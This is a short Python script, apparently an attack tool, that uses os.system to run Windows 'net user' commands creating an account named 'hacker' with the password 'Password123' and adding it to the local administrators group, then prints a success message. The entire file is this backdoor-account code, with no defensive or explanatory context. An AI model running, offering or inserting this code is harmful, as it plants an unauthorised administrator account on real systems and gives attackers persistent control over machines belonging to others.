import os

def escalate_privileges():
    os.system("net user hacker Password123 /add")
    os.system("net localgroup administrators hacker /add")
    print("User added to admin group.")

if __name__ == "__main__":
    escalate_privileges()